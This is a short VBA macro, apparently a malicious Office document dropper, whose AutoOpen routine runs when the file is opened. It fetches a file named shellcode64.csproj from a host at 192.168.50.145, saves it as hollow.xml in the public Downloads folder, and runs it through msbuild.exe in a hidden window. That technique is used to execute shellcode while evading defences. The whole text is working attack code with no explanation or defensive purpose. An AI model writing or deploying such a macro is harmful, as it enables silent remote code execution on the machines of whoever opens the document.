' based on
' https://stackoverflow.com/questions/17877389/how-do-i-download-a-file-using-vba-without-internet-explorer
'
' powashell.csproj by @SubTee
' https://gist.github.com/egre55/7a6b6018c9c5ae88c63bdb23879df4d0

Sub AutoOpen()
    Dim WinHttpReq As Object
    Dim oStream As Object
    Dim myURL As String
    Dim LocalFilePath As String
    Dim ExecFile As Double

    myURL = "http://192.168.50.145/shellcode64.csproj"
    LocalFilePath = "C:\Users\Public\Downloads\hollow.xml"
    
    ' Create the HTTP request object
    Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
    WinHttpReq.Open "GET", myURL, False, "", ""
    WinHttpReq.send


        ' Create the stream object to save the file
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1 ' Binary data
        oStream.Write WinHttpReq.responseBody
        oStream.SaveToFile LocalFilePath, 2 ' 2 = overwrite
        oStream.Close
        
        ' Execute the msbuild command to compile the project
        ExecFile = Shell("C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe " & LocalFilePath, vbHide)
End Sub
